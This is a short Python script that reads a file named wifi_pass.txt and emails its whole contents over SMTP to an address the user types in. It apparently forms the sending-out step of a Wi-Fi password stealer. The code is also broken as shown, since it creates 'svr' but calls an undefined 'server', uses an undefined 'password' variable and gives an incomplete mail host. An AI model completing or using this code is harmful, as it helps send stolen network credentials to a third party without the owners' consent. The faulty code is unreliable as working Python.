import smtplib
import os

sender_email = input('Enter Sender Email Address: ')
reciver_email = input('Enter Reciver Email Address: ')
sender_email_password = str(input('Enter Sender Email Password: '))

msg = ''

f = open('wifi_pass.txt', '+r')
for line in f:
 	msg += line

# print (msg)

svr = smtplib.SMTP('smtp.gmail', 587)
server.starttls()
lg = server.login(sender_email, password)
server.sendmail(sender_email, reciver_email, msg)